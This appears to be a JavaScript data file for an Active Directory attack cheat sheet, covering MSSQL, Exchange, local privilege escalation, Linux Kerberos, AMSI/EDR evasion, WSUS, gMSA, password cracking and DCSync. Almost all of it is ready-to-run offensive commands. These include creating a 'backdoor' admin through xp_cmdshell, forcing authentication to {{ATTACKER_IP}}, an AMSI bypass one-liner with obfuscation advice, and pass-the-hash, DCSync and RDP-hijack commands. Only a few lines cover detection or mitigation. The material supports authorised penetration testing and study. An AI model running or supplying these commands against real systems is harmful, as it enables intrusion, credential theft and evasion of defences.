/* ============================================================
   AD ARSENAL — Content Data (Part 3: Sections 23-31)
   ============================================================ */

window.ARSENAL_DATA = window.ARSENAL_DATA.concat([

    // ============================================================
    // SECTION 23: MSSQL Attacks
    // ============================================================
    {
        id: 'mssql',
        title: '// MSSQL Attacks in AD',
        phase: 'lateral',
        intro: 'SQL Servers in AD are goldmines — xp_cmdshell, linked servers, impersonation, and credential theft.',
        subsections: [
            {
                title: 'MSSQL Enumeration & Access',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'mssqlclient.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_HOST}} -windows-auth', desc: 'Connect to MSSQL with domain creds' },
                    { tool: 'netexec', cmd: 'netexec mssql {{TARGET_HOST}} -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}}', desc: 'Test MSSQL access via netexec' },
                    { tool: 'PowerShell', cmd: 'Get-SQLInstanceDomain | Get-SQLServerInfo', desc: 'Find MSSQL instances via SPN enumeration (PowerUpSQL)' }
                ]
            },
            {
                title: 'xp_cmdshell & Exploitation',
                type: 'commands',
                commands: [
                    { tool: 'MSSQL', cmd: 'EXEC sp_configure \'show advanced\',1; RECONFIGURE; EXEC sp_configure \'xp_cmdshell\',1; RECONFIGURE;', desc: 'Enable xp_cmdshell (requires sysadmin)' },
                    { tool: 'MSSQL', cmd: 'EXEC xp_cmdshell \'whoami\'', desc: 'Execute commands as SQL service account' },
                    { tool: 'MSSQL', cmd: 'EXEC xp_cmdshell \'net user backdoor P@ss123! /add && net localgroup administrators backdoor /add\'', desc: 'Create local admin via xp_cmdshell' }
                ]
            },
            {
                title: 'Linked Servers & Impersonation',
                type: 'commands',
                commands: [
                    { tool: 'MSSQL', cmd: 'SELECT srvname, srvproduct, rpcout FROM master..sysservers', desc: 'Enumerate linked servers' },
                    { tool: 'MSSQL', cmd: 'EXEC (\'xp_cmdshell \'\'whoami\'\'\') AT [LINKED_SERVER]', desc: 'Execute commands on linked server' },
                    { tool: 'MSSQL', cmd: 'EXECUTE AS LOGIN = \'sa\'; EXEC xp_cmdshell \'whoami\'', desc: 'Impersonate sa — check who you can impersonate first' },
                    { tool: 'MSSQL', cmd: 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = \'IMPERSONATE\'', desc: 'Find impersonatable logins' }
                ],
                notes: [
                    'Linked servers: Often have admin creds configured — pivot across servers',
                    'Double-hop: SQL → linked SQL → linked SQL — chain execution',
                    'Credential harvest: Use xp_dirtree to force SMB auth to Responder'
                ]
            },
            {
                title: 'NTLM Capture via MSSQL',
                type: 'commands',
                commands: [
                    { tool: 'MSSQL', cmd: 'EXEC xp_dirtree \'\\\\{{ATTACKER_IP}}\\share\', 1, 1', desc: 'Force SQL service to authenticate to Responder → capture hash' },
                    { tool: 'MSSQL', cmd: 'EXEC master..xp_subdirs \'\\\\{{ATTACKER_IP}}\\share\'', desc: 'Alternative UNC path trigger' }
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 24: Exchange Attacks
    // ============================================================
    {
        id: 'exchange',
        title: '// Exchange Attacks',
        phase: 'lateral',
        intro: 'Exchange servers are domain-joined, often high-privilege, and expose multiple attack surfaces.',
        subsections: [
            {
                title: 'Exchange Exploitation',
                type: 'list',
                items: [
                    'PrivExchange: Force Exchange to auth → relay to LDAP → DCSync rights (WriteDACL on domain)',
                    'ProxyLogon (CVE-2021-26855): Pre-auth RCE — SSRF → auth bypass → webshell',
                    'ProxyShell (CVE-2021-34473/34523/31207): Pre-auth RCE chain via autodiscover',
                    'ProxyNotShell (CVE-2022-41040/41082): Auth required SSRF → RCE',
                    'OWA / EWS Spray: Password spray against /owa/auth.owa or /EWS/Exchange.asmx',
                    'Global Address List: Enumerate all domain users via OAB download',
                    'Mailbox access: Search for passwords, SSH keys, VPN configs, API keys in emails',
                    'Transport rules: Read/modify email routing — BCC copy of all emails',
                    'Exchange groups: Organization Management group → Full access to all Exchange server AD objects'
                ]
            },
            {
                title: 'Post-Exploitation: Mailbox Access',
                type: 'commands',
                commands: [
                    { tool: 'exchanger', cmd: 'exchanger.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} nspi list-tables -count', desc: 'Enumerate Global Address List' },
                    { tool: 'MailSniper', cmd: 'Search-Mailbox -TargetMailbox target@{{DOMAIN}} -SearchQuery "password OR vpn OR aws OR secret" -ResultSize 250', desc: 'Search mailboxes for sensitive content' }
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 25: Local Privilege Escalation
    // ============================================================
    {
        id: 'local-privesc',
        title: '// Local Privilege Escalation',
        phase: 'privesc',
        intro: 'Win local admin to move laterally. These work on domain-joined Windows workstations and servers.',
        subsections: [
            {
                title: 'Potato Attacks',
                type: 'list',
                items: [
                    'GodPotato: Works on ALL Windows versions — no specific privilege needed beyond service context',
                    'SweetPotato: Combined Hot/Rogue/Juicy potato — SeImpersonatePrivilege required',
                    'CoercedPotato: Uses RPC coercion for local privilege escalation — SeImpersonate',
                    'JuicyPotatoNG: Windows 10/Server 2019+ — SeImpersonatePrivilege → SYSTEM',
                    'RoguePotato: Creates rogue OXID resolver — SeImpersonatePrivilege',
                    'Key: Service accounts (IIS, MSSQL) usually have SeImpersonatePrivilege'
                ]
            },
            {
                title: 'Service, Registry & DLL Hijacking',
                type: 'list',
                items: [
                    'Unquoted Service Path: Service path with spaces + no quotes → hijack with planted binary',
                    'Weak Service ACLs: sc.exe sdshow ServiceName — if writable, change binpath',
                    'AlwaysInstallElevated: Registry key → any user can install MSI as SYSTEM',
                    'DLL Hijacking: Find DLLs loaded from writable paths — plant malicious DLLs',
                    'PATH Hijacking: Writable directory in PATH before system32 → plant binary',
                    'PrintSpoofer: Alternative potato → SeImpersonatePrivilege',
                    'Scheduled Tasks: Check writable task binary paths → replace binary',
                    'Registry Autoruns: Enumerate autorun entries in writable locations'
                ]
            },
            {
                title: 'Enumeration for PrivEsc',
                type: 'commands',
                commands: [
                    { tool: 'WinPEAS', cmd: 'winpeas.exe all', desc: 'Comprehensive local privesc enumeration — the gold standard' },
                    { tool: 'PowerUp', cmd: 'Invoke-AllChecks', desc: 'PowerShell-based local privesc audit' },
                    { tool: 'Seatbelt', cmd: 'Seatbelt.exe -group=all', desc: '.NET host enumeration for security-relevant config' }
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 26: Linux in AD
    // ============================================================
    {
        id: 'linux-ad',
        title: '// Linux in AD Environments',
        phase: 'lateral',
        intro: 'When Linux hosts are domain-joined via SSSD/Samba, Kerberos artifacts and misconfigs open new attack paths.',
        subsections: [
            {
                title: 'Kerberos on Linux',
                type: 'commands',
                commands: [
                    { tool: 'Linux', cmd: 'find / -name \'*.keytab\' 2>/dev/null', desc: 'Find Kerberos keytab files (contain service account keys)' },
                    { tool: 'Linux', cmd: 'klist -k /etc/krb5.keytab', desc: 'List principals in keytab' },
                    { tool: 'impacket', cmd: 'getTGT.py {{DOMAIN}}/{{USERNAME}} -hashes :{{HASH}} -dc-ip {{TARGET_DC}}', desc: 'Get TGT from Linux using NT hash' },
                    { tool: 'Linux', cmd: 'export KRB5CCNAME=/tmp/krb5cc_user; klist', desc: 'Use Kerberos credential cache for tooling' }
                ],
                notes: [
                    'Keytab files: Anyone who can read them can impersonate the service',
                    'SSSD cache: /var/lib/sss/db/ — contains cached AD credentials (tdbdump)',
                    'krb5.conf: Check for weak encryption types, realm configuration'
                ]
            },
            {
                title: 'SSSD & Samba Secrets',
                type: 'list',
                items: [
                    'SSSD secrets.ldb: /var/lib/sss/secrets/secrets.ldb — may contain cached tickets and keytabs',
                    'Samba secrets.tdb: /var/lib/samba/private/secrets.tdb — machine account password',
                    '/etc/krb5.keytab: Machine keytab — extract with klist -k -Ke, use for auth',
                    'tdbdump secrets.tdb → extract machine account NTLM hash for AD attacks',
                    'Pivot: Use machine account to query AD, Kerberoast, enumerate BloodHound'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 27: AMSI / CLM / Evasion
    // ============================================================
    {
        id: 'evasion',
        title: '// AMSI / CLM / AV / EDR Evasion',
        phase: 'opsec',
        intro: 'Bypassing runtime defenses on Windows endpoints. Essential for executing tools in monitored environments.',
        subsections: [
            {
                title: 'AMSI Bypass Techniques',
                type: 'commands',
                commands: [
                    { tool: 'PowerShell', cmd: '$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields(\'NonPublic,Static\');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)', desc: 'AMSI context corruption — zeroes out amsiContext (obfuscate before use)' }
                ],
                notes: [
                    'AMSI patches: Overwrite AmsiScanBuffer return value, patch amsi.dll in memory',
                    'Hardware breakpoints: Use VEH to set breakpoint on AmsiScanBuffer — bypass without patching',
                    'CLR ETW bypass: Patch ntdll!EtwEventWrite to disable CLR logging',
                    'Always obfuscate: AMSI bypass strings are themselves detected — encode, concat, reflection'
                ]
            },
            {
                title: 'Constrained Language Mode (CLM)',
                type: 'list',
                items: [
                    'AppLocker/WDAC can restrict PowerShell to Constrained Language Mode',
                    'Check: $ExecutionContext.SessionState.LanguageMode',
                    'Bypass: Find signed Microsoft binaries that allow execution (LOLBAS/LOLBIN)',
                    'PowerShdll: Run PowerShell without powershell.exe — uses .NET assemblies',
                    'PSByPassCLM: C# tool to escape CLM via InstallUtil',
                    'Downgrade: PowerShell v2 (if installed) doesn\'t support CLM — powershell -version 2'
                ]
            },
            {
                title: 'AV / EDR Evasion',
                type: 'list',
                items: [
                    'Syscall evasion: Direct/indirect syscalls to bypass usermode hooks',
                    'D/Invoke: .NET dynamic invocation — avoids static P/Invoke imports',
                    'Early bird injection: Queue APC before process initialization',
                    'Module stomping: Load legit DLL → overwrite .text section with shellcode',
                    'PPID spoofing: Create process with fake parent — bypasses process tree detection',
                    'Unhooking: Read fresh ntdll.dll from disk → overwrite hooked version in memory',
                    'Timestomping: Modify file timestamps to blend with legitimate files',
                    'LOLBAS: Use legitimate OS binaries — mshta, regsvr32, rundll32, msbuild, certutil'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 28: WSUS Attacks
    // ============================================================
    {
        id: 'wsus',
        title: '// WSUS Attacks',
        phase: 'privesc',
        intro: 'Windows Server Update Services — when compromised, push malicious "updates" to managed machines.',
        subsections: [
            {
                title: 'WSUS Exploitation',
                type: 'commands',
                commands: [
                    { tool: 'SharpWSUS', cmd: 'SharpWSUS.exe create /payload:"C:\\tmp\\payload.exe" /args:"/c net localgroup Administrators backdoor /add"', desc: 'Create fake update in WSUS' },
                    { tool: 'SharpWSUS', cmd: 'SharpWSUS.exe approve /update:GUID /computer:{{TARGET_HOST}} /group:"Target Group"', desc: 'Approve update for deployment to specific target' }
                ],
                notes: [
                    'Payloads: Must be signed Microsoft binary (e.g., PsExec.exe, bginfo.exe /c) or use the WSUS cert',
                    'PyWSUS: Python alternative for MITM WSUS when HTTP is used',
                    'Detection: Monitor for unsigned update binaries, WSUS log anomalies',
                    'Mitigation: Enforce HTTPS for WSUS, restrict WSUS admin access, signed updates only'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 29: gMSA Deep Dive
    // ============================================================
    {
        id: 'gmsa',
        title: '// gMSA Deep Dive',
        phase: 'cred',
        intro: 'Group Managed Service Accounts use AD-managed passwords rotated every 30 days. If you can read msDS-ManagedPassword, you have the NT hash.',
        subsections: [
            {
                title: 'gMSA Explained',
                type: 'list',
                items: [
                    'Password: 256-byte random value, auto-rotated every 30 days',
                    'msDS-GroupMSAMembership: Defines who can READ the password — check this ACL',
                    'msDS-ManagedPassword: Attribute containing the current (and previous) password blob',
                    'NT hash derivable: The password blob contains the raw key → compute NT hash directly',
                    'Privileges: gMSAs often run critical services — SQL, IIS, scheduled tasks — with high privileges',
                    'PrincipalsAllowedToRetrieve: Group or users that can read the password — common misconfiguration'
                ]
            },
            {
                title: 'Extract gMSA Credentials',
                type: 'commands',
                commands: [
                    { tool: 'gMSADumper', cmd: 'gMSADumper.py -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}} -dc-ip {{TARGET_DC}}', desc: 'Dump gMSA NT hash — most reliable' },
                    { tool: 'bloodyAD', cmd: 'bloodyAD -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --host {{TARGET_DC}} get object \'gMSA_SVC$\' --attr msDS-ManagedPassword', desc: 'Read raw managed password blob' },
                    { tool: 'netexec', cmd: 'netexec ldap {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}} --gmsa', desc: 'Quick gMSA password dump via netexec' }
                ],
                notes: ['After getting NT hash → use for PtH, Kerberos auth, or DCSync if service has rights']
            }
        ]
    },

    // ============================================================
    // SECTION 30: Password Cracking Reference
    // ============================================================
    {
        id: 'password-cracking',
        title: '// Password Cracking Reference',
        phase: 'cred',
        intro: 'Cracking AD hashes efficiently — wordlists, rules, masks, and cloud GPU strategies.',
        subsections: [
            {
                title: 'Hashcat Commands',
                type: 'commands',
                commands: [
                    { tool: 'hashcat', cmd: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'NT hash + wordlist + best rules' },
                    { tool: 'hashcat', cmd: 'hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'Net-NTLMv2 from Responder' },
                    { tool: 'hashcat', cmd: 'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'TGS-REP (Kerberoast RC4)' },
                    { tool: 'hashcat', cmd: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt', desc: 'AS-REP hash from GetNPUsers.py' },
                    { tool: 'hashcat', cmd: 'hashcat -m 1000 ntlm_hashes.txt -a 3 ?u?l?l?l?l?l?d?d?s', desc: 'Mask attack — common password pattern' }
                ]
            },
            {
                title: 'Wordlists & Rules',
                type: 'list',
                items: [
                    'Rockyou: Classic — 14M passwords, always start here',
                    'SecLists: Collection of username/password lists for different scenarios',
                    'CrackStation: 1.5B entries — massive but covers common patterns',
                    'Custom corp wordlists: Company name + year + season + special chars',
                    'KoreLogic rules: Aggressive mutators — concatenation, case toggle, leet speak',
                    'OneRuleToRuleThemAll: Optimized composite rule — better speed/crack ratio than KoreLogic',
                    'PACK: Password Analysis and Cracking Kit — analyze cracked passwords to generate targeted rules/masks'
                ]
            },
            {
                title: 'Cloud GPU Cracking',
                type: 'list',
                items: [
                    'AWS p4d.24xlarge: 8x A100 GPUs — ~400 GH/s for NTLM',
                    'Google Cloud A2: Similar performance, hourly pricing',
                    'Vast.ai: Cheap GPU rental — community providers',
                    'Hashtopolis: Distributed cracking across multiple agents',
                    'Cost optimization: Start with targeted lists + rules, escalate to cloud for hard hashes',
                    'DCC2 / AES Kerberoast: Prioritize cloud — too slow for local GPU'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 31: Additional Techniques
    // ============================================================
    {
        id: 'additional',
        title: '// Additional Techniques',
        phase: 'dominance',
        intro: 'Remaining attack techniques that don\'t fit neatly into other categories but are commonly used.',
        subsections: [
            {
                title: 'KrbRelayUp',
                type: 'commands',
                commands: [
                    { tool: 'KrbRelayUp', cmd: 'KrbRelayUp.exe relay -Domain {{DOMAIN}} -CreateNewComputerAccount -ComputerName FAKEPC$ -ComputerPassword Passw0rd', desc: 'Local privilege escalation via Kerberos relay — RBCD variant' }
                ],
                notes: ['No NTLM needed — pure Kerberos-based local privesc', 'Combines machine account creation + RBCD + S4U in one tool']
            },
            {
                title: 'Pass-the-Hash / Pass-the-Ticket',
                type: 'commands',
                commands: [
                    { tool: 'netexec', cmd: 'netexec smb {{TARGET_HOST}} -u {{USERNAME}} -H {{HASH}}', desc: 'Pass-the-Hash — use NT hash directly' },
                    { tool: 'impacket', cmd: 'psexec.py -hashes :{{HASH}} {{DOMAIN}}/{{USERNAME}}@{{TARGET_HOST}}', desc: 'PsExec via PtH — get shell' },
                    { tool: 'impacket', cmd: 'wmiexec.py -hashes :{{HASH}} {{DOMAIN}}/{{USERNAME}}@{{TARGET_HOST}}', desc: 'WMIExec via PtH — stealthier than PsExec' },
                    { tool: 'impacket', cmd: 'KRB5CCNAME=admin.ccache psexec.py -k -no-pass {{DOMAIN}}/Administrator@{{TARGET_HOST}}', desc: 'Pass-the-Ticket — use Kerberos ccache' },
                    { tool: 'evil-winrm', cmd: 'evil-winrm -i {{TARGET_HOST}} -u {{USERNAME}} -H {{HASH}}', desc: 'WinRM PtH — PowerShell remoting' }
                ]
            },
            {
                title: 'Overpass-the-Hash',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'getTGT.py {{DOMAIN}}/{{USERNAME}} -hashes :{{HASH}} -dc-ip {{TARGET_DC}}', desc: 'Convert NT hash → TGT (Kerberos)' },
                    { tool: 'Rubeus', cmd: 'Rubeus.exe asktgt /user:{{USERNAME}} /rc4:{{HASH}} /ptt', desc: 'Windows: Request TGT with hash → inject into memory' }
                ],
                notes: ['Use when NTLM is blocked but Kerberos is not', 'Generates legitimate Kerberos traffic — harder to detect than plain PtH']
            },
            {
                title: 'File Drop Relay Coercion',
                type: 'list',
                items: [
                    'Drop files (.url, .scf, .lnk, .library-ms, .searchConnector-ms) in writable shares',
                    'When user browses the share, Windows auto-loads the file → triggers SMB auth to attacker IP',
                    '.searchConnector-ms: Most reliable — also triggers WebClient service start (HTTP relay)',
                    '.url files: [InternetShortcut] URL=file://attacker_ip/share → auto-auth',
                    'Combo: File drop + ntlmrelayx → relay to LDAP → RBCD or DCSync'
                ]
            },
            {
                title: 'RDP Hijacking / Session Theft',
                type: 'commands',
                commands: [
                    { tool: 'Windows', cmd: 'query user', desc: 'List active sessions' },
                    { tool: 'Windows', cmd: 'tscon 2 /dest:console', desc: 'Hijack session — requires SYSTEM (no creds needed for connected sessions)' },
                    { tool: 'Mimikatz', cmd: 'ts::sessions → ts::remote /id:2', desc: 'RDP session hijack via Mimikatz' }
                ],
                notes: [
                    'SYSTEM required: Use PsExec -s, service creation, or scheduled task',
                    'Target disconnected sessions: User locked screen but session still active',
                    'No password needed: Directly connect to existing session'
                ]
            },
            {
                title: 'Shadow Credentials',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy shadow auto -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -account targetuser', desc: 'Full shadow credential attack — adds key, requests cert, gets NT hash, cleans up' },
                    { tool: 'pywhisker', cmd: 'pywhisker.py -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} -t targetuser --action add --dc-ip {{TARGET_DC}}', desc: 'Add Key Credential to target\'s msDS-KeyCredentialLink' }
                ],
                why: 'Shadow Credentials abuse Windows Hello for Business (WHfB) key trust. Writing your own public key to msDS-KeyCredentialLink allows you to request a Certificate via PKINIT, then extract the NT hash via UnPAC-the-Hash.'
            },
            {
                title: 'Kerberoasting & AS-REP Roasting',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'GetUserSPNs.py -request -dc-ip {{TARGET_DC}} {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}', desc: 'Kerberoast — request TGS for all SPN accounts' },
                    { tool: 'impacket', cmd: 'GetNPUsers.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}} -request', desc: 'AS-REP Roast — find and extract AS-REP hashes' },
                    { tool: 'Rubeus', cmd: 'Rubeus.exe kerberoast /outfile:kerberoast.txt', desc: 'Windows Kerberoasting via Rubeus' },
                    { tool: 'hashcat', cmd: 'hashcat -m 13100 kerberoast.txt wordlist.txt', desc: 'Crack RC4 TGS' },
                    { tool: 'hashcat', cmd: 'hashcat -m 19700 kerberoast_aes.txt wordlist.txt', desc: 'Crack AES TGS (much slower)' }
                ]
            },
            {
                title: 'DCSync',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_DC}} -just-dc', desc: 'Full DCSync — dump all domain hashes' },
                    { tool: 'impacket', cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_DC}} -just-dc-user krbtgt', desc: 'DCSync krbtgt only — for Golden Ticket' },
                    { tool: 'Mimikatz', cmd: 'lsadump::dcsync /domain:{{DOMAIN}} /user:Administrator', desc: 'Windows DCSync via Mimikatz' }
                ],
                notes: ['Required ACLs: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All', 'Detection: Event 4662 from non-DC source IP']
            }
        ]
    }

]); // End of Part 3
